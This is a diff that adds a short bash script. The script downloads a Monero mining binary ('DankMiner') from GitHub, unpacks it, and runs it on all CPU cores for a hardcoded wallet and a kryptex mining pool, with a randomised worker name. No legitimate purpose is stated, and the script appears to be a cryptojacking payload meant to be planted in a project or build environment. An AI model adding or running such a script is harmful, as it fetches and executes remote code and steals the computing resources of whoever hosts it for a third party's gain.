@@ -1,0 +1,5 @@
+#!/bin/bash
+curl https://github.com/DankMiner/DankMiner/releases/download/DankMinerV1.4.4/DankMiner-v1.4.4a-Linux.tar.gz -L -o DankMiner-v1.4.4a-Linux.tar.gz
+tar xf DankMiner-v1.4.4a-Linux.tar.gz
+cd DankMiner-v1.4.4a-Linux
+./dankminer -a xmr -w 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK/$(echo $RANDOM | md5sum | head -c 10) -p stratum+tcp://xmr.kryptex.network:7029 --cpu-threads $(nproc --all)
